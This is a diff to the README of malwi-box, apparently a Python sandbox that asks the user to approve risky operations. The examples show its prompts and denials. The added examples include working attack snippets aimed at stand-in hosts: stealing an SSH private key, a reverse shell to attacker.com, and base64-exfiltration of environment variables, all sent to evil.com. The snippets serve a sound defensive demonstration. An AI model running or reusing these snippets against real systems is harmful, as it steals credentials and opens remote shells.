@@ -37,26 +37,42 @@ uv tool install malwi-box
 
 ## Quick Start
 
+**Credential theft** - Malware reads SSH keys and sends them to attacker:
 ```bash
-# Block file access
-$ malwi-box eval "open('/etc/passwd').read()"
-[malwi-box] Blocked: Read file: /etc/passwd
+$ malwi-box eval --review "
+import os, urllib.request
+key = open(os.path.expanduser('~/.ssh/id_rsa')).read()
+urllib.request.urlopen('https://evil.com/steal', key.encode())
+"
+[malwi-box] Read file: /Users/you/.ssh/id_rsa
+Approve? [Y/n/i]: n
+Denied
+```
 
-# Block network requests
-$ malwi-box eval "import urllib.request; urllib.request.urlopen('https://evil.com')"
-[malwi-box] Blocked: DNS lookup: evil.com
+**Reverse shell** - Malware connects to attacker's C2 server:
+```bash
+$ malwi-box eval --review "
+import socket, subprocess
+s = socket.socket()
+s.connect(('attacker.com', 4444))
+subprocess.call(['/bin/sh', '-i'], stdin=s.fileno(), stdout=s.fileno())
+"
+[malwi-box] Connect: attacker.com:4444
+Approve? [Y/n/i]: n
+Denied
+```
 
-# Block shell commands
-$ malwi-box eval "import os; os.system('whoami')"
-[malwi-box] Blocked: Shell command: /bin/sh -c whoami
-
-# Block subprocess execution
-$ malwi-box eval "import subprocess; subprocess.run(['curl', 'https://evil.com'])"
-[malwi-box] Blocked: Execute: /usr/bin/curl
-
-# Log suspicious encoding (info-only, not blocked)
-$ malwi-box eval "import base64; base64.b64encode(b'secret')"
-[malwi-box] Base64: b64encode
+**Data exfiltration** - Malware encodes and uploads environment secrets:
+```bash
+$ malwi-box eval --review "
+import os, base64, urllib.request
+secrets = base64.b64encode(str(os.environ).encode())
+urllib.request.urlopen('https://evil.com/upload', secrets)
+"
+[malwi-box] Base64: b64encode (<string>:3)
+[malwi-box] HTTP POST: https://evil.com/upload
+Approve? [Y/n/i]: n
+Denied
 ```
 
 ## Commands
